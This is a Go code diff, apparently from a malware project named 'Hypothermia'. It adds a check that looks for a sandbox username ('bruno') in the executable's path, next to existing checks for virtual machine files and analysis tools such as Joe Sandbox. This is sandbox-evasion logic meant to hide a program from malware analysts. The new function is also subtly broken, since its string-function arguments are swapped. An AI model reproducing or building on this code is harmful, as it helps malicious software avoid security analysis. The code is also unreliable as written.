@@ -55,6 +55,10 @@ var processes = [27]string{
 	"joeboxserver.exe",
 }
 
+var vtNames = [1]string{
+	"bruno",
+}
+
 func CheckVMs() bool {
 	for _, vm := range vms {
 		if _, err := os.Stat("C:\\windows\\system32\\" + vm); os.IsNotExist(err) {
@@ -89,6 +93,23 @@ func CheckProcesses() bool {
 	procs := string(out)
 	for _, proc := range processes {
 		if strings.Contains(procs, proc) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func CheckVT() bool {
+	path, err := os.Executable()
+	if err != nil {
+		return false
+	}
+
+	path = strings.ToLower(path)
+
+	for _, name := range vtNames {
+		if strings.Contains(name, path) && !strings.HasSuffix("Hypothermia.exe", path) {
 			return true
 		}
 	}
